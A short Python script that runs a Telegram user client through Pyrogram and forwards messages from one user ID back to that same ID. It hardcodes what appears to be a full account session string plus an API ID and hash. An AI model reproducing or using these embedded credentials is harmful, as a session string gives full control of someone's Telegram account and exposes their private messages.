from pyrogram import Client, filters
from pyrogram.types import Message
from time import sleep
import pyrogram
import json
import jdatetime
import threading
import pytz

feri = 'AQCIP6gZeS83zy5yeCfzj-GgaXo-5ZKPhzcbRLROPjyMgbvbqyZVtYm7JS0vNWUuf_6BvaojtAuYbOUtVkV6hnr-OUAyvSwSqXr5Bbpp1bfncJPnnBZXptLY8lBreRktUH-0PVTnSiZEaxvmiIF0e6sd8Xr3WSIh2FZapeUZZgv2yxMGyv_wPw-vlDwA2ALK-KnX_CbhCOt46kS1bJB56GSn5F-Z6TaPfaDwT6HmANhDoiwW8oUpD720peqDKG030Lit3-ibhywGTrePj95tTvGkrYPy6wUebKNdKgIf-_e5Id9LFaWgYyZp2As20Ijgvk4W_WrCscb2hNmy1XM0r9JEAAAAAU7Pks4A'

app = Client(session_name=feri, api_id=29723786, api_hash='6963a88a79a3a75bed72f467805be851')

id_or_username = '2113150493'


@app.on_message(filters.user(2113150493))
async def forward_code(app:Client, message:Message):
    await app.forward_messages(id_or_username, message.chat.id,)

app.run()
